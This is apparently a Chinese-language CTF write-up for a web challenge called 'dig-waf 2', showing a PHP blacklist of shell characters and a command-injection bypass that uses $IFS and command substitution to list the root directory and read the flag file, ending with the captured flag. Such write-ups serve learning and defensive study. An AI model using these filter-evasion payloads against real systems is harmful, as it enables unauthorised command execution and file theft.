#Web

## 題目

**dig-waf 2**
給了一個網址，跟 [[Dig waf 1]] 的長一樣，但 blacklist 多了偵測空白
```php
$blacklist = ['|', '&', ';', '>', '<', "\n", " ", 'flag'];
```

## 解題
1. 觀察網頁，發現不能使用空白 -> 使用 IFS 內建分隔符 `$IFS`
   --> 嘗試 `aaa'$IFS$(ls$IFS/)'`
   ![[W1-14_ls.png]]
2. 找出 flag：`aaa'$IFS$(cat$IFS/fla?_o2837ry)'`
   ![[W1-14_flag.png|448]]
3. flag = `CTF{digtools_waf2_5b5da484441e7fb75c5bc7c7}`